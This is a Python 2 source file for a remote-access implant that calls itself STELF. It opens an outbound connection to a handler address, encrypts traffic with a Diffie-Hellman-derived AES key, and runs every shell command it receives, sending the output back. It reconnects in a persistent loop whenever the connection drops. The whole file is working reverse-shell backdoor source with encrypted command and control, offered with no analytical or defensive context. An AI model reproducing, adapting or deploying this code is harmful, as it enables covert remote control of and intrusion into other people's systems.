import socket
import Queue
import subprocess
import os
import threading
import logging
import time
import psutil
from Crypto.Cipher import AES
from Crypto.Random import random
import zlib
import base64
import hashlib

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")

class StoppableThread(threading.Thread):
	"""
	Thread that can be stopped by an external force.
	"""
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()
	
class Channel:
	"""
	Channels are used to split data into streams.
	"""
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		logging.debug("Channel created with ID "+str(ord(self.id)))
		
	def write_input(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip())
		self.input_queue.put(data)
		
	def read_input(self, blocking=True):
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip())
			return data
		except Queue.Empty: return None
		
	def write_output(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
		self.output_queue.put(self.id+data)
		
	def __repr__(self):
		print "Channel ID: "+str(ord(id))
	
class Transport:
	""""
	Transport handles sending data between STELF and the handler.
	"""
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.comm_socket = socket.socket()
		
		self.master_queue = Queue.Queue()
		self.user_channel = Channel(chr(97), self.master_queue)
		self.signal_channel = Channel(chr(254), self.master_queue)
		
		self.disconnected = False
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}

		
	def connect(self):
		logging.info("Attempting to connect to "+self.handler_ip+":"+str(self.handler_port))
		try:
			self.comm_socket.connect((self.handler_ip, self.handler_port))
			logging.info("Connected!")
			
			self.aes_obj = self.dh_exchange()
			
			for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
				t = StoppableThread(target=f)
				t.daemon = True
				t.start()
				
			return True
		except Exception as e:
			logging.warn("Failed to connect to handler: "+str(e))
			return False
			
	def dh_exchange(self):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		logging.debug("Starting key exchange.")
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		self.comm_socket.sendall(str(public_key))
		server_key = self.comm_socket.recv(4096)
		
		sharedSecret = pow(int(server_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		logging.info("Key: "+key+", IV: "+IV)
		
		return AES.new(key, AES.MODE_CFB, IV)
			
	def encrypt(self, data):
		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(zlib.decompress(base64.b64decode(data)))
		
	def send(self, data):
		data = self.encrypt(data)
		try: self.comm_socket.sendall(data)
		except: pass
		
	def recv(self):
		if self.disconnected: return ""
		try: data = self.comm_socket.recv(4096)
		except: data = ""
		if not data:
			logging.error("Handler disconnected")
			self.comm_socket.close()
			return self.user_channel.id+"CONN_LOST"
		return self.decrypt(data)
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to handler: "+data[1:])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from handler: "+data.strip())
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			if signal == "CREATE_CHANNEL":
				pass
				
	def create_channel(self, id):
		self.channels[id] = Channel(id, self.master_queue)
		
class Execute:
	"""
	Functions related to executing programs.
	"""
	def __init__(self):
		self.killed = False
		
	def kill_proc(self, pid):
		logging.warn("Killing command after taking over a minute to execute.")
		process = psutil.Process(pid)
		for proc in process.children(recursive=True):
			proc.terminate()
		process.terminate()
		self.killed = True
		
	def execute_shell_command(self, command):
		logging.info("Executing shell command: "+command.strip())
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		timer = threading.Timer(60, self.kill_proc, [proc.pid])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		if self.killed: out += "\n(Process terminated after taking too long to execute)"
		timer.cancel()
		self.killed = False
		logging.debug("Result of shell command: "+out.strip())
		return out
		
class Filesystem:
	"""
	Functions related to interacting with the file system.
	"""
	def change_directory(self, dir):
		try:
			os.chdir(dir)
			return ""
		except Exception as e:
			return str(e)
		
execute = Execute()
fs = Filesystem()
			
class Shell:
	"""
	This is where the all remote control magic happens.
	"""
	def __init__(self, transport):
		self.transport = transport
		self.channel = self.transport.user_channel
		
	def run(self):
		if not self.transport.connect(): return False
		
		while True:
			data = self.recv()
			if data == "CONN_LOST":
				return False
			if data.startswith("cd"):
				data = data[3:]
				output = fs.change_directory(data.strip())
			else:
				output = execute.execute_shell_command(data)
				
			self.send(output+"\n"+os.getcwd()+">>")
		
	def send(self, data):
		self.channel.write_output(data)
		
	def recv(self):
		return self.channel.read_input()
		
while True:
	shell = Shell(Transport("127.0.0.1",8080))
	if not shell.run():
		del shell
		for t in threading.enumerate():
			try: t.stop()
			except: pass
		time.sleep(5)
		
	else: os._exit(0)